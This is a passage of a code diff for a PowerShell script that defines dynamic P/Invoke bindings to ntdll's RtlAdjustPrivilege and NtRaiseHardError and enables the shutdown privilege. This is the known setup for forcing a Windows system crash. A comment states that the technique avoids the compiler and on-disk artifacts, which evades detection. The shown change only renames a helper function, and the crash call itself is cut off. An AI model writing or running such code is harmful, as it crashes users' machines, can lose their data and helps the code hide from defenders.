@@ -44,19 +44,19 @@ foreach ($drive in $drives) {
 }
 
 # Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevent on-disk artifacts
-$asmName = New-Object Reflection.AssemblyName "DInvoke"
+$asmName = New-Object Reflection.AssemblyName "PInvoke"
 $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
 $mod = $asm.DefineDynamicModule("DynamicModule", $false)
 $type = $mod.DefineType("NativeMethods")
 
-function Add-DInvoke {
+function Add-PInvoke {
     param($DllName, $Name, $ParameterTypes, $ReturnType)
     $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
     $mb.SetImplementationFlags('PreserveSig')
 }
 
-Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
-Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
+Add-PInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
+Add-PInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
 
 $NM = $type.CreateType()
 $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
